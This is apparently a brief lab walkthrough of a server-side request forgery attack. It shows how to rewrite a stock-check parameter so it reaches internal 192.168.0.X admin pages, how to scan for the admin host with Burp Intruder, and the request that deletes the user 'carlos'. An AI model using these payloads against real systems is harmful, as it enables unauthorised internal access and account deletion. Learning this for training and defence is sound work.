task : use the stock check functionality to scan the internal 192.168.0.X range for an admin interface on port 8080, then use it to delete the user carlos


`stockApi=http%3A%2F%2F192.168.0.1%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D2%26storeId%3D1`

same as previous lab but as we can see after decode it

stockApi=http://192.168.0.1:8080/product/stock/check?productId=2&storeId=1

modify it to `stockApi=http%3a%2f%2f192.168.0.1%3a8080%2fadmin` so we can search at what ip this page is available .

using burpsuite intruder :

determine what to bruteforce :

![image](https://user-images.githubusercontent.com/67979878/128208683-621b13f2-703e-4bdd-af56-cee1a9931370.png)
setting options :

![image](https://user-images.githubusercontent.com/67979878/128207786-7e48f408-e23b-4bf6-8669-249907a59417.png)

start attack and observe status :
![image](https://user-images.githubusercontent.com/67979878/128209259-2e2e6462-2ff1-4164-b737-589c2513b650.png)

now we can make a valid request :
with the SSRF we can send requests only so we should do it all with post and get methods .

http://192.168.0.68:8080/admin/delete?username=carlos
